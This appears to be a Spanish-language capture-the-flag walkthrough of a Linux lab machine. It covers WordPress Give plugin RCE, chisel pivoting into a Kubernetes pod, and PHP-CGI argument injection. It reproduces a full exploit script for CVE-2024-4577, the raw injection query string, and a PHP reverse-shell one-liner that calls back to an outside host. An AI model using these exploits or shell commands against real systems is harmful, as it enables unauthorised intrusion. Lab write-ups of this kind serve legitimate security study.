Dificultad: Medium
IP: 10.10.11.95
OS: Linux

# Escaneo

### Ping 

![[Pasted image 20251109112746.png]]

### Nmap

### Busqueda de puertos

![[Pasted image 20251109113725.png]]

### Escaneo especifico de cada puerto

![[Pasted image 20251109115044.png]]

# Pagina Web

![[Pasted image 20251109120732.png]]

vemos una pagina en la que está corriendo wordpress, la version de wordpress como tal no es vulnerable, pero buscando en los plugins vemos uno importante, Give:

![Pasted image 20251106145050.png](app://215ba0ee89762c3f6dd8e453dca622739d40/Users/jp/Documents/GitHub/Mi_Camino/Imagenes/Pasted%20image%2020251106145050.png?1762458650026)

Vemos que está en la versión 3.14.0, la cual tiene una vulnerabilidad de RCE, la que podemos explotar enviando un formulario json especifico, para ello podemos usar el siguiente [PoC](https://github.com/EQSTLab/CVE-2024-5932):
### Reverse Shell

![[Pasted image 20251109121709.png]]

# Pivoting

Conseguimos acceso a la maquina pero rapidamente nos damos cuenta que no hay algo muy importante,  ademas de que nos encontramos en un Pod, que es basicament eun contenedor tipo docker de [[Kubernetes]], viendo en las mismas variables de entorno encontramos una IP que puede contener un servidor:

![[Pasted image 20251109130807.png]]

Ahora vamos a Pivotear para poder analizar esta IP:

### Pasando Chisel

***Nos ponemos a la escucha***

![[Pasted image 20251109131807.png]]

**Hacemos la llamada**

![[Pasted image 20251109132534.png]]

**Damos permisos**

![[Pasted image 20251109132616.png]]

**Esperamos una conexión con chisel**

![[Pasted image 20251109134203.png]]

**Y ahora nos conectamos**

![[Pasted image 20251109134530.png]]

**Escaneando el puerto 5000 de la IP 10.43.2.241 con Nmap** 

```ruby
proxychains4 nmap 10.43.2.241 -p5000 -sCVT -T5 -Pn  
```

![[Pasted image 20251109171721.png]]

Vemos que es una pagina, por lo que configuraremos burpsuite para que reciba los paquetes de firefox y luego los envie a por el tunel que creamos:

**Configuración Burpsuite**

![[Screenshot 2025-11-09 at 5.35.19 PM.png]]

**Redirigimos todo el trafico http a Burp**

![[Pasted image 20251109173810.png]]

# Analisis de la pagina 

![[Pasted image 20251109173947.png]]

Vemos que está usando PHP-CGI, una tecnologia comunmente vulnerable a RCE, y en internet encontramos un PoC que puede servirnos (Spoiler: Tenemos que modificarlo porque no funciona de forma normal xd):

```python
"""
PHP CGI Argument Injection (CVE-2024-4577) Remote Code Execution PoC
Discovered by: Orange Tsai (@orange_8361) of DEVCORE (@d3vc0r3)
Exploit By: Aliz (@AlizTheHax0r) and Sina Kheirkhah (@SinSinology) of watchTowr (@watchtowrcyber) 
Technical details: https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/?github
Reference: https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/
"""

banner = """			 __         ___  ___________                   
	 __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________ 
	 \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
	  \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
	   \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|   
				  \\/          \\/     \\/                            
	  
        watchTowr-vs-php_cve-2024-4577.py
        (*) PHP CGI Argument Injection (CVE-2024-4577) discovered by Orange Tsai (@orange_8361) of DEVCORE (@d3vc0r3)
          - Aliz Hammond, watchTowr (aliz@watchTowr.com)
          - Sina Kheirkhah (@SinSinology), watchTowr (sina@watchTowr.com)
        CVEs: [CVE-2024-4577]  """


import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
import requests
requests.packages.urllib3.disable_warnings()
import argparse

print(banner)
print("(^_^) prepare for the Pwnage (^_^)\n")

parser = argparse.ArgumentParser(usage="""python CVE-2024-4577 --target http://192.168.1.1/index.php -c "<?php system('calc')?>""")
parser.add_argument('--target', '-t', dest='target', help='Target URL', required=True)
parser.add_argument('--code', '-c', dest='code', help='php code to execute', required=True)
args = parser.parse_args()
args.target = args.target.rstrip('/')


s = requests.Session()
s.verify = False



res = s.post(f"{args.target.rstrip('/')}?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", data=f"{args.code};echo 1337; die;" )
if('1337' in res.text ):
    print('(+) Exploit was successful')
else:
    print('(!) Exploit may have failed')
    
```

**Explotación Manual:**

Usamos la cadena: `?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input` como parametros para una petición GET, y luego en el body ponemos el comando a ejecutar:

![[Pasted image 20251109180926.png]]

Haremos una reverse shell usando php ya que bash no está disponible:

```php
php -r '$sock=fsockopen("10.10.10.10",9001);exec("sh <&3 >&3 2>&3");'
```

![[Pasted image 20251109183019.png]]

# Kubernetes Explotation

Encontramos archivos de autenticación 

![[Pasted image 20251109192604.png]]
